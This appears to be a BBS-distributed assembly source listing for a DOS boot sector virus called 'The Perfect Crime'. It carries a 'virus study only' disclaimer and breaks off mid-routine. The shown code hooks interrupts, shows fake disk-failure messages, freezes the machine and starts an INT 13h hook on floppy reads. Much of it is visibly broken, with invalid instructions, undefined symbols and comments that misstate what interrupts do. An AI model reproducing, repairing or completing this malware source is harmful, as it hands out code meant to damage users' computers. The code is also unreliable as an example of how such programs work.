;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
	page	,132
	title	The 'Perfect Crime' Boot Virus

	; The bootsector code has been modified so that it now acts as
	; a partition table, allowing access to hidden partitions on a
	; 1.44 megabyte floppy disk.
	;
	; This source code is compiled with MASM 5.0 and represents
	; a practical example of malicious program coding.

	.model	tiny
	.code

	org	0

start:
	jmp	short BeginCode		; Hop past data

English_Mess	db	0Dh,'The "Perfect Crime" Virus Copyright (c) 1993 SOKU',0Dh,0Ah
	db	'This boot sector cannot be used on a 1.44 megabyte disk.',0Dh,0Ah
	db	'Most likely caused by infection of a dirty floppy.',0Dh,0Ah,0A5h
Mess_End	equ	$-1
FATAL_Mess	db	0Dh,0A5h,'Serious hardware or DOS problem$',0Dh,0A5h
Mess_End2	equ	$

BeginCode:
	mov	ax,0			; \ Service interrupt #19 (Error)
	call	Interrupt		; /

	cli				; Prevent interrupts while setting stack pointer
	mov	sp,HighStack		; Required for first infected system
	sti

	push	cs
	pop	ds			; DS points to code segment
	cmp	byte ptr ds:[SystemFlag],1	; Has this already infected?
	je	Cleanup			; If yes, skip all this

	lea	si,[ds:BootAddr]	; SI points to original BIOS bootsect
	xor	di,di			; DI points to destination
	mov	cx,(BootEnd-BiosArea)/2	; CX holds number of words to move
	rep	movsw			; Copy original boot code

	lea	si,[ds:Storage+2]	; SI points to original Interrupt Address
	mov	bx,0			; Set vector for interrupt #19 (Error)
	jmp	far jump		; Far jump through our data

	dec	word ptr ds:[SystemFlag]	; Decrement counter - always zero after first run

ComMsg	db	0Dh,0Ah,'Boot failure: check diskette.',0Dh,0Ah
	db	'$'

Cleanup:
	cli				; Disable interrupts
	mov	ss,cs			; SS equals CS
	mov	sp,HighStack		; SP inside code segment at high stack address
	sti

	jmp	MainMenu		; Go display menu

PartitionTable:
	db	0,0,0,0			; Original Partition Table
	db	0,0,0,0			;
	db	0,0,0,0			; 
	db	0,0,0,0			;

BadInt19:
	cli
	mov	ah,0
	int	1Ah
	mov	al,1
	jmp	HandleErrors		; Check if we should display message,
					;  beep, lockup computer, etc...

ExitInt19:
	db	0EAh			; Far Jump to old INT 19 vector
OldInt19Offset dw	?			; Old INT 19 offset here
OldInt19Segment dw	? 			; Old INT 19 segment here

ComErrMessage db	'Drive C: Error$',0Ch,0Ah
	db	'Diskette drive error$',0Ch,0Ah
	db	'$'
DisplayCommMsg:
	cli
	push	cs			; \ Segment registers point to code segment
	push	cs
	pop	ds			; /
	pop	es
	mov	dx,offset ComMsg	; DX points to comm error message
	mov	ah,9			; Display string function
	int	21h
	retf				; Return from interrupt - beep & lockup

HandleErrors:
	xchg	al,ah			; Swap AL & AH - AL=0
	cmp	al,1			; Intermittent diskette error ?
	jne	CheckDrive		; If not, check what's wrong
	beep
	jmp	ExitInt19		; And return to error handler
CheckDrive:
	cmp	al,2			; Drive C: error ?
	jne	ExitInt19		; If not, exit gracefully
	pushf				; Save flags
	cld
	mov	dl,2			; Select drive C:
	mov	ah,1			; Read Disk Drive Format Data function
	int	25h			; Get drive format info
	popf				; Restore flags
	jnc	SafeDrive		; CF set if serious problem
	jmp	ErrorOccured
SafeDrive:
	pushf				; Save flags again
	mov	dl,2			; Re-select drive C:
	mov	ah,0			; Reset Disk Drive function
	int	25h			; Reset specified drive
	popf				; Restore flags
	jnc	ExitInt19		; Branch back if no problems
ErrorOccured:
	jmp	DisplayCommMsg		; Show DOS message then beep & lockup

ComHardFailMsg db	'Drive C: Hardware Failure$',0Dh,0Ah
	db	'Diskette drive failure$',0Dh,0Ah
	db	'$'

HardFailure:
	cli
	push	cs
	push	cs
	pop	ds
	pop	es
	mov	dx,offset ComHardFailMsg
	mov	ah,9
	int	21h
	cli
	jmp	$			; Lockup computer
ReturnFromInt19:
	jmp	far ptr jump		; Far jump through our vector table

JumpTable:
	jmp	Short BadInt19		; 0: Comm. error
	jmp	Short ExitInt19		; 1: Hard Fail
	jmp	Short MainHandler	; 2: Main Handler

MainHandler:
	cli
	push	ax			; Save registers used
	push	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	di
	push	si
	push	bp
	push	cflag
	push	aflag
	push	fpuflag

	cmp	ah,0AAh			; Verify installation ?
	je	CheckInstall		; If ah == 0AAh branch to CheckInstall

	mov	cflag,cf		; Save initial carry flag state
	jmp	ReturnFromInt19

CheckInstall:
	cmp	ds:cflag,1		; Check if carry initially set
	je	Branch1			; Carry was set
	dec	byte ptr ds:cflag	; Adjust value in carry reg
Branch1:
	popf				; Restore flags
	cmp	ah,30h			; DOS version function call
	jb	Verify			; Branch if not version 2.x +
	cmp	al,2			; DOS version 2.x +
	jbe	Verify			; Branch if version 2.0 or 2.1
Verify:
	pop	cflag			; Load carry flag to its original state
	popf				; Restore flags
PopJmps:
	pop	si			; \ Pop saved register values
	pop	di
	pop	es
	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	far ptr jump		; Far jump through our vector table

BiosArea:
	mov	ss,cs:[BiosSS]		; SS = original SS
	mov	sp,cs:[BiosSP]		; SP = original SP
	db	0EAh			; Far jump to old INT 19 vector
OldInt19Address dd	?			; Location of old INT 19 here

Int13h:
	pushf				; Save flags
	cmp	ah,2			; Read function call
	jne	ReturnFromInt13		; Branch back if not read
	cmp	dl,0			; Drive A: ?
	jne	ReturnFromInt13